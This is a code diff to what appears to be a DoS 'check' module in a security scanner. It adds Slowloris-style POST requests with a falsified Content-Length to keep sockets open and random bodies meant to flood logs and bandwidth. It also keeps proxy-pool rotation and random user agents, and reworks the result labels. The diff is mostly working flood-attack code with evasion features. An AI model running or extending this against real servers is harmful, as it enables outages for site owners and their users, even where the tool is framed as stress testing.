@@ -58,7 +58,7 @@ def check(base_url, scenario, logger):
             with dead_proxies_lock:
                  # Double check inside lock
                  if len(dead_proxies) >= len(proxies) * 0.9:
-                     print(f"    [DoS] ♻️  Proxy pool exhausted. Recycling {len(dead_proxies)} dead proxies...")
+                     # Log removed to reduce noise
                      dead_proxies.clear()
         
         return random.choice(proxies) # Fallback
@@ -117,9 +117,14 @@ def check(base_url, scenario, logger):
                 
                 if s:
                     try:
-                        s.send(f"GET {scenario.target} HTTP/1.1\r\n".encode())
+                        method = scenario.method.upper()
+                        s.send(f"{method} {scenario.target} HTTP/1.1\r\n".encode())
                         s.send(f"Host: {target_ip}\r\n".encode())
                         s.send(f"User-Agent: {random.choice(USER_AGENTS)}\r\n".encode())
+                        if method == "POST":
+                             s.send(f"Content-Length: 10000\r\n".encode()) # Lie about length for Slowloris to keep open
+                             s.send(f"Content-Type: application/x-www-form-urlencoded\r\n".encode())
+
                         my_sockets.append(s)
                         with lock: stats["connected"] += 1
                     except: s.close()
@@ -167,10 +172,21 @@ def check(base_url, scenario, logger):
         ]
         
         # Assemble HTTP/1.1 Request
-        header_str = "\r\n".join(headers) + "\r\n\r\n"
-        request_line = f"GET {scenario.target} HTTP/1.1\r\n"
+        # Assemble HTTP Request (Dynamic Method)
+        method = scenario.method.upper()
+        if method not in ["GET", "POST", "PUT", "DELETE", "HEAD", "OPTIONS"]: method = "GET"
         
-        payload = (request_line + header_str).encode()
+        body = ""
+        if method == "POST":
+            # high-volume random body to fill logs/bandwidth
+            body = f"data={random.getrandbits(128)}&cache_bust={random.randint(1, 100000)}"
+            headers.append(f"Content-Length: {len(body)}")
+            headers.append("Content-Type: application/x-www-form-urlencoded")
+        
+        header_str = "\r\n".join(headers) + "\r\n\r\n"
+        request_line = f"{method} {scenario.target} HTTP/1.1\r\n"
+        
+        payload = (request_line + header_str + body).encode()
         
         while not stop_event.is_set():
             p = get_proxy()
@@ -282,9 +298,13 @@ def check(base_url, scenario, logger):
     if is_down:
         return CheckResult(scenario.id, scenario.type, "VULNERABLE", "CRITICAL", f"DoS SUCCESS: Server is DEAD. {res_details}")
     elif stats['blocked'] + stats['dropped'] > (stats['requests'] + stats['connected']):
-        # Explicit user request: "consider critical findings as blocked" -> Now "SECURE" per user demand
-        return CheckResult(scenario.id, scenario.type, "SECURE", "HIGH", f"DoS Mitigated by Target. {res_details}")
+        status = "BLOCKED"
+        msg = "Attack Intercepted by WAF/Proxy Failure."
+        if not HttpClient._is_internet_available():
+            status = "ERROR"
+            msg = "CONNECTION LOST: Local network failure during attack."
+        return CheckResult(scenario.id, scenario.type, status, "HIGH", f"{msg} {res_details}")
     elif stats['requests'] > 1000 or stats['connected'] > 100:
-        return CheckResult(scenario.id, scenario.type, "VULNERABLE", "HIGH", f"DoS Effective (High Load). {res_details}")
+        return CheckResult(scenario.id, scenario.type, "SECURE", "INFO", f"Stress Test Completed: Server Survived High Load. {res_details}")
     else:
-        return CheckResult(scenario.id, scenario.type, "SECURE", "MEDIUM", f"Server resisted attack. {res_details}")
+        return CheckResult(scenario.id, scenario.type, "INCONCLUSIVE", "LOW", f"Insufficient Traffic to Verify. {res_details}")
